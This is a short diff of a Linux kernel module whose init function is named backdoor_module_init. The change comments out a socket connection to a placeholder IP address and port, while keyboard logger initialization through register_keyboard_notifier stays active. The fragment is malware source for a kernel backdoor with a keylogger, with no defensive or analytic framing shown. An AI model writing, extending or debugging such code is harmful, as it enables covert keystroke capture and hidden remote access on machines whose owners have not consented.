@@ -21,11 +21,11 @@ static int __init backdoor_module_init(void) {
     int result;
 
     //Socket Initialization
-    result = create_socket(IP_ADDRESS, PORT);
-    if (result < 0) {
-        printk(KERN_ERR "Failed to connect\n");
-        return result;
-    }
+    // result = create_socket(IP_ADDRESS, PORT);
+    // if (result < 0) {
+    //     printk(KERN_ERR "Failed to connect\n");
+    //     return result;
+    // }
 
     // Keyboard Logger Initialization
     result = register_keyboard_notifier(&keyboard_notifier_block);
